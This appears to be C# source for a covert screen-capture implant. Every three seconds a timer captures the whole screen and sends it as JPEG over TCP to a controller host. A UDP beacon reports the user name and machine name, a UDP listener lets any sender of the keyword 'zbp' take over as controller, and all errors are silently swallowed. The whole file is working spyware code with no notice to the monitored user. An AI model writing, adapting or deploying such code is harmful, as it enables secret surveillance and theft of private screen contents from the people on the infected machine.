using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using WindowsService.windowApi;

namespace WindowsFormsApp1.core
{
    class App
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        public bool isDone { get; set; }

        UdpClient udp = new UdpClient();
        IPEndPoint receivePoint;
        //TcpClient tcpClient; 
        private string mastHost = "D4";
        private int masterPort = 8085;
        private bool isConnect = false;
        static UdpClient server;
        bool isChecked = false;
        bool masterPost = false;

        public App()
        {
            
            timer.Interval = 3000;
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
            isDone = false;
            initNetWork();
            ThreadPool.QueueUserWorkItem(checkHost);
        }

   

        private void initNetWork()
        {
            if (isChecked == false)
            {
                string host = mastHost;
                if (masterPost == false)
                {
                    host = "192.168.129.71";

                    IPHostEntry iPHostEntry = null;
                    try
                    {
                        iPHostEntry = Dns.GetHostEntry(mastHost);
                        foreach (IPAddress ad in iPHostEntry.AddressList)
                        {
                            if (ad.AddressFamily.ToString() == "GetHostEntry")
                            {
                                host = ad.Address.ToString();
                                break;
                            }
                        }
                        Console.WriteLine("host IP:" + host);
                    }
                    catch (Exception ex)
                    {

                    }
                }

                mastHost = host;
                IPAddress address;
                IPAddress.TryParse(mastHost, out address);
                receivePoint = new IPEndPoint(address, 5124);
                isChecked = true;
            }
        }

        private void keepAlive()
        {

            //获取机器名
            string machineName = Environment.MachineName;
            //获取用户名
            string userName = Environment.UserName;

            Byte[] data = Encoding.Default.GetBytes("DADDY,I'm " + userName + " from " + machineName);
            udp.Send(data, data.Length, receivePoint);

        }

        private  void checkHost(object state)
        {

            try
            {

                IPEndPoint receivePoint = new IPEndPoint(IPAddress.Any, 0);
                server = new UdpClient(5125);
                while (true)
                {


                    byte[] recData = server.Receive(ref receivePoint);
                    if (recData != null && recData.Length > 0)
                    {
                        try
                        {

                            string msg = Encoding.Default.GetString(recData);
                            Console.WriteLine("msg :" + msg);
                            if (msg == "zbp")
                            {
                                mastHost = receivePoint.Address.ToString();
                                masterPost = true;
                                Console.WriteLine("master ip:" + mastHost);
                            }
                        }
                        catch (Exception ex)
                        {

                        }
                    }
                }
            }
            catch (Exception ex) {
            }


        }


        private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                ScreenCapture sc = new ScreenCapture();
                Image image = sc.CaptureScreen();

                try
                {

                    Byte[] data = ImageToBytes(image);
                    keepAlive();
                    if (data.Length > 0)
                    {
                        tcpSendData(data);
                    }
                }
                catch (SocketException ex)
                {
                    isChecked = false;
                    initNetWork();
                }
                catch (Exception ex)
                {

                    //Console.WriteLine(ex.StackTrace);
                    //Console.WriteLine(ex.Message);
                }

            }
            catch { }


            //sc.CaptureScreenToFile("C:/Users/tianchengjun/Pictures/pic/" + getTimeStamp() + ".jpg", ImageFormat.Jpeg);
        }

        private void tcpSendData(Byte[] datas)
        {
            var tcpClient = new TcpClient(mastHost, masterPort);
            if (tcpClient != null)
            {
                if (tcpClient.Connected == false)
                {
                    tcpClient.Connect(IPAddress.Parse(mastHost), masterPort);
                }
            }
            if (tcpClient.Connected)
            {
                NetworkStream ns = tcpClient.GetStream();
                ns.Write(datas, 0, datas.Length);
                ns.Close();
                tcpClient.Close();
            }
        }

        private long getTimeStamp()
        {
            DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(new System.DateTime(1970, 1, 1, 0, 0, 0, 0));
            DateTime nowTime = DateTime.Now;
            long unixTime = (long)System.Math.Round((nowTime - startTime).TotalMilliseconds, MidpointRounding.AwayFromZero);
            return unixTime;
        }



        public static byte[] ImageToBytes(Image image)
        {
            ImageFormat format = image.RawFormat;
            using (MemoryStream ms = new MemoryStream())
            {
                //if (format.Equals(ImageFormat.Jpeg))
                //{
                //    image.Save(ms, ImageFormat.Jpeg);
                //}
                //else if (format.Equals(ImageFormat.Png))
                //{
                //    image.Save(ms, ImageFormat.Png);
                //}
                //else if (format.Equals(ImageFormat.Bmp))
                //{
                //    image.Save(ms, ImageFormat.Bmp);
                //}
                //else if (format.Equals(ImageFormat.Gif))
                //{
                //    image.Save(ms, ImageFormat.Gif);
                //}
                //else if (format.Equals(ImageFormat.Icon))
                //{
                //    image.Save(ms, ImageFormat.Icon);
                //}
                image.Save(ms, ImageFormat.Jpeg);
                byte[] buffer = new byte[ms.Length];
                //Image.Save()会改变MemoryStream的Position，需要重新Seek到Begin
                ms.Seek(0, SeekOrigin.Begin);
                ms.Read(buffer, 0, buffer.Length);
                return buffer;
            }
        }
    }
}
